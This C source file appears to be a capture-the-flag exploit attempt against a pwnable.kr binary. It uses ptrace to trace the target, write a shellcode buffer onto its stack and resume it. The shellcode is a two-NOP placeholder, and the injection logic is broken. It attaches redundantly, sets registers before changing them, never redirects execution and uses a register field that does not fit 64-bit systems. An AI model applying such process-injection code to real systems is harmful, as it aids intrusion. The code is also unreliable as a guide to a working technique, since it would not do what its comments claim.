#include <stdio.h>
#include <stdlib.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>

#define TARGET_PATH "/home/tiny/tiny"

#define LOCAL_PATH "/home/Ningen/Desktop/Linux-Machine/Pwnable.kr/Hacker_Secret/tiny"

// Example shellcode (replace with your own)
unsigned char shellcode[] = {
    0x90, 0x90, // NOP instructions (just an example)
};

int main() {
    pid_t child;
    struct user_regs_struct regs;
    
    child = fork();
    if (child == 0) {
        // Child process: execute the target binary
        ptrace(PTRACE_TRACEME, 0, NULL, NULL);
        execl(TARGET_PATH, TARGET_PATH, NULL);
        perror("execl failed");
        exit(1);
    } else if (child < 0) {
        perror("fork failed");
        return 1;
    }
    
    // Parent process: wait for the child to stop
    waitpid(child, NULL, 0);

    // Attach to the child process
    if (ptrace(PTRACE_ATTACH, child, NULL, NULL) == -1) {
        perror("ptrace attach");
        return 1;
    }
    
    // Wait for the target process to stop
    waitpid(child, NULL, 0);
    
    // Get the registers to find esp
    if (ptrace(PTRACE_GETREGS, child, NULL, &regs) == -1) {
        perror("ptrace getregs");
        return 1;
    }
    
    // Current stack pointer (esp)
    unsigned long *esp = (unsigned long *)regs.esp;
    
    // Write shellcode to the stack
    for (size_t i = 0; i < sizeof(shellcode); i += sizeof(long)) {
        long word = 0;
        memcpy(&word, &shellcode[i], sizeof(long) < sizeof(shellcode) - i ? sizeof(long) : sizeof(shellcode) - i);
        if (ptrace(PTRACE_POKEDATA, child, esp + (i / sizeof(long)), word) == -1) {
            perror("ptrace pokedata");
            return 1;
        }
    }
    
    // Modify esp to point to the shellcode
    ptrace(PTRACE_SETREGS, child, NULL, &regs);
    regs.esp = (unsigned long)esp; // Update esp to point to shellcode
    if (ptrace(PTRACE_SETREGS, child, NULL, &regs) == -1) {
        perror("ptrace setregs");
        return 1;
    }
    
    // Continue the target process
    ptrace(PTRACE_CONT, child, NULL, NULL);
    
    // Detach from the target process
    ptrace(PTRACE_DETACH, child, NULL, NULL);
    
    return 0;
}
